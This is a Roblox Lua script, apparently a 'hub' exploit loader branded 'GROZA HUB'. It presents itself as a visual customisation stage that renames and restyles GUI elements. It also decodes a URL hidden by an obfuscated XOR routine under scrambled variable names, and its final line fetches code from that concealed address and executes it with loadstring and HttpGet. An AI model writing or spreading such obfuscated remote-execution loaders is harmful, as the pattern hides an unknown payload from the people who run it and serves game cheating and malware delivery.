
--[[ STAGE 2: VISUAL CORE ]]
local gh2g1YIPB56EDkqBH4c6h="\152\161\166\175\179\255\241\246\200\190\209\211\201\207\223\221\034\228\237\244\055\007\255\014\075\023\034\111\250\011\060\117\058"local bA6j77YgQWX9XeKliLN4=70 local r5JSUTdDV9nyMnrEJryVh=90 local JxecxcqVpvEM2c0fdEEKpu=0 local w4gRzMztzrYy1=5 local O4GvRXXxZxCnQY=11 local UkrXXPeJWAPoHRV2hysX=false local LR3qOH9_sw_oyN6dLooAYl=bit32 and bit32.bxor if not LR3qOH9_sw_oyN6dLooAYl then LR3qOH9_sw_oyN6dLooAYl=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local R1jTdoLlw_uv={}for uQYEhcnMCMabCzUWh=1,#gh2g1YIPB56EDkqBH4c6h do local imkdYQVIKAZcetUj=string.byte(gh2g1YIPB56EDkqBH4c6h,uQYEhcnMCMabCzUWh)local GrstyXUJObuwFYMHNt=(r5JSUTdDV9nyMnrEJryVh+(uQYEhcnMCMabCzUWh*w4gRzMztzrYy1)+O4GvRXXxZxCnQY)%256 if JxecxcqVpvEM2c0fdEEKpu==0 then imkdYQVIKAZcetUj=(imkdYQVIKAZcetUj-GrstyXUJObuwFYMHNt)%256 R1jTdoLlw_uv[uQYEhcnMCMabCzUWh]=string.char(LR3qOH9_sw_oyN6dLooAYl(imkdYQVIKAZcetUj,bA6j77YgQWX9XeKliLN4))else imkdYQVIKAZcetUj=LR3qOH9_sw_oyN6dLooAYl(imkdYQVIKAZcetUj,bA6j77YgQWX9XeKliLN4)R1jTdoLlw_uv[uQYEhcnMCMabCzUWh]=string.char((imkdYQVIKAZcetUj-GrstyXUJObuwFYMHNt)%256)end end local Z7yWYhZTC9_o7k8I=table.concat(R1jTdoLlw_uv)if UkrXXPeJWAPoHRV2hysX then Z7yWYhZTC9_o7k8I=string.reverse(Z7yWYhZTC9_o7k8I)end local fgsHO7Humr2EPEgYKkN=Z7yWYhZTC9_o7k8I
local HubName = "GROZA HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(fgsHO7Humr2EPEgYKkN))()
